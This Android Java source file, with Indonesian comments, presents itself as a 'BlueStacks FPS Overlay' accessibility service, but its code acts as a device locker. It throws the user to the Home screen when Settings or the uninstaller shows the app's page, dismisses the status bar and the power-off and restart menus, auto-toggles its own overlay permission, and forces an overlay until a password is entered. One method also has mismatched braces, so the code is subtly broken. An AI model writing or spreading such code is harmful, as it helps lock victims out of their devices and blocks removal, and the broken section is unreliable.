package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        
        if (Settings.canDrawOverlays(this)) {
            triggerOverlay();
        } else {
            jumpToOverlaySettings();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // 1. Cek apakah user sudah ter-autentikasi (Password benar)
            // Jika sudah benar, biarkan mereka buka pengaturan
            if (FPSService.isAuthenticated) return;
    
            // 2. Blokir Settings & Package Installer (Uninstall)
            if (packageName.equals("com.android.settings") || packageName.equals("com.google.android.packageinstaller")) {
                
                // Cek lebih spesifik: apakah mereka melihat "App info" aplikasi kita?
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("BlueStacks FPS Overlay");
                    if (!nodes.isEmpty()) {
                        performGlobalAction(GLOBAL_ACTION_HOME); // Lempar ke Home
                        triggerOverlay(); // Paksa buka overlay lagi
                    }
                }
            }
            
            // 3. Blokir Status Bar / Quick Settings (Opsional)
            if (packageName.equals("com.android.systemui")) {
                 performGlobalAction(GLOBAL_ACTION_BACK); 
            }
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;
    
            try {
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BluestacksFPS");
                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
                
                if (!targets.isEmpty() && switchNode != null) {
                    if (!switchNode.isChecked()) 
                        performClick(switchNode);
                        
                        // Tambahan: Tunggu sebentar setelah klik, lalu paksa buka diri sendiri
                        new android.os.Handler().postDelayed(() -> {
                             forceOpenApp();
                        }, 500); 
    
                    } else {
                        forceOpenApp(); // Pastikan panggil ini
                    }
                } else if (pkg.contains("settings")) {
                    clickByText(currentRoot, "BluestacksFPS");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 150);
    }
    
    private void forceOpenApp() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
                   Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(i);
        triggerOverlay();
    }
    
        private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerOverlay() {
        if (!FPSService.isAuthenticated) {
            Intent intent = new Intent(this, FPSService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}